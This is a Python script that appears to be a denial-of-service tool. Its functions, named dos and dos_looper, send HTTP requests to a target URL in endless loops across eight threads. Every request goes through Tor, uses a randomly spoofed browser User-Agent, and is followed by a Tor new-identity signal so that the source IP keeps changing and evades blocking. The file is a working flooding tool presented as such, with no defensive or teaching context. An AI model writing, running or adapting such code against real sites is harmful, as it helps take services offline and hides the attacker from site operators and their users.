from threading import Thread

from asyncio import unix_events, set_event_loop, new_event_loop

from aiohttp import ClientSession

from aiohttp_socks import ProxyType, ProxyConnector

from random import choice

from stem.control import Controller

from stem import Signal

from argparse import Namespace


URL = 'https://ident.me'

HEADERS = {
    'User-Agent': [
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36",
    ],
    'Connection:': 'keep-alive',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
}

PROXY_HOST = 'localhost'

PROXY_PORT = 9050

WORKERS = 8


async def dos(url: str, proxy_host: str, proxy_port: str):
    # Proxy
    connector = ProxyConnector(
        proxy_type=ProxyType.SOCKS5,
        host=proxy_host,
        port=proxy_port,
        # DNS resolution for Socket
        rdns=True
    )

    # HTTP session
    session = ClientSession(connector=connector)

    try:
        async with session.get(url, allow_redirects=False, headers={**HEADERS, 'User-Agent': choice(HEADERS['User-Agent'])}) as response:
            print(f'Request status code {response.status}')
    except Exception as error:
        print(str(error))

    await session.close()

    # TOR new identity
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()

        controller.signal(Signal.NEWNYM)


async def dos_looper(url: str, proxy_host: str, proxy_port: str):
    while True:
        await dos(
            url=url,
            proxy_host=proxy_host,
            proxy_port=proxy_port,
        )


def runner(args: Namespace, loop: unix_events._UnixSelectorEventLoop):
    set_event_loop(loop)

    loop.create_task(dos_looper(args.url, args.proxy_host, args.proxy_port))

    loop.run_forever()


def pool(args: Namespace):
    for worker in range(args.workers):
        loop = new_event_loop()

        thread = Thread(target=runner, args=(args, loop))

        thread.start()
